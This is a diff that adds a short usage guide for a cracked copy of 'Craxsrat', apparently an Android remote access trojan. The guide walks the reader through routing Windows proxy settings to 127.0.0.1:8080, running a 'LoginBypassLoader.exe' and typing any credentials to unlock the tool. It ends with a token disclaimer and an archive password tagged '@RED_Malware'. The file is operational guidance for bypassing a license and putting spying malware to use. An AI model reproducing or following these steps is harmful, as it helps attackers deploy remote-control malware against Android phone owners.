@@ -1,0 +1,18 @@
+----------------How To Use-----------------
+1: First Off Your Internet Connection : If Use RDP Then No Need OFF
+
+2: Search Proxy Setting in Your Windows PC & RDP
+
+3: Off Automatically Detect Settings : then Scroll Down Come in Manual Proxy Setup
+
+4: On use a proxy Server & Paste in Adreess: 127.0.0.1 Port: 8080 & Save
+: Also see Provide Image Check.png How to Do This Step
+
+5: Now Run LoginBypassLoader.exe and Minimize
+
+5: Then Start Craxsrat and Type any email pass and click login : And Done :)
+
+6: Then Off Proxy server & Close Loader.exe & Connect Your Internet
+
+Note: Disclaimer: Without Permission Android Hacking is Illegal, So Don't Try. Creator or Developer Not Responsible Your Any Type of Action. and Password:- @RED_Malware
+
